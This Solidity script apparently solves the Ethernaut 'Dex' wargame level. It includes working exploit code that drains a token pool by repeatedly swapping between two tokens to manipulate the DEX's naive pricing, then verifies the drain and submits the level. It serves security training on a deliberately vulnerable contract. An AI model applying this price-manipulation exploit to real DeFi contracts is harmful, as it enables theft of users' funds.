// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

/**
 *
 * Level address: 0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F
 * The goal of this level is for you to hack the basic DEX contract below and
 * steal the funds by price manipulation.
 *
 * You will start with 10 tokens of token1 and 10 of token2. The DEX contract
 * starts with 100 of each token.
 *
 * You will be successful in this level if you manage to drain all of at least 1
 * of the 2 tokens from the contract, and allow the contract to report a "bad"
 * price of the assets.
 *
 *
 *
 * Quick note
 * Normally, when you make a swap with an ERC20 token, you have to approve the
 * contract to spend your tokens for you. To keep with the syntax of the game,
 * we've just added the approve method to the contract itself. So feel free to
 * use contract.approve(contract.address, <uint amount>) instead of calling the
 * tokens directly, and it will automatically approve spending the two tokens by
 * the desired amount. Feel free to ignore the SwappableToken contract
 * otherwise.
 *
 *   Things that might help:
 *
 * How is the price of the token calculated?
 * How does the swap method work?
 * How do you approve a transaction of an ERC20?
 * Theres more than one way to interact with a contract!
 * Remix might help
 * What does "At Address" do?
 *
 */
contract Pawn {
    Dex private dex;

    constructor(Dex _dex) {
        dex = _dex;
    }

    function attack() public {
        SwappableToken token1 = SwappableToken(dex.token1());
        SwappableToken token2 = SwappableToken(dex.token2());

        token1.approve(msg.sender, address(this), type(uint256).max);
        token2.approve(msg.sender, address(this), type(uint256).max);
        token1.transferFrom(
            msg.sender, address(this), token1.balanceOf(msg.sender)
        );
        token2.transferFrom(
            msg.sender, address(this), token2.balanceOf(msg.sender)
        );
        token1.approve(address(this), address(dex), type(uint256).max);
        token2.approve(address(this), address(dex), type(uint256).max);

        address from = dex.token1();
        address to = dex.token2();

        while (true) {
            uint256 fromBalance = dex.balanceOf(from, address(dex));
            uint256 toBalance = dex.balanceOf(to, address(dex));

            if (fromBalance == 0 || toBalance == 0) {
                break;
            }

            uint256 amount = dex.balanceOf(from, address(this));
            uint256 swapAmount = dex.getSwapPrice(from, to, amount);

            if (swapAmount >= toBalance) {
                amount = fromBalance;
            }
            dex.swap(from, to, amount);
            (from, to) = (to, from);
        }
    }
}

contract DexScript is Attacker {
    Level private level = Level(0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Dex dex = Dex(instance);
        Pawn pawn = new Pawn(dex);

        pawn.attack();

        SwappableToken token1 = SwappableToken(dex.token1());
        SwappableToken token2 = SwappableToken(dex.token2());
        require(
            token1.balanceOf(address(dex)) == 0
                || token2.balanceOf(address(dex)) == 0,
            "Level not solved"
        );
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
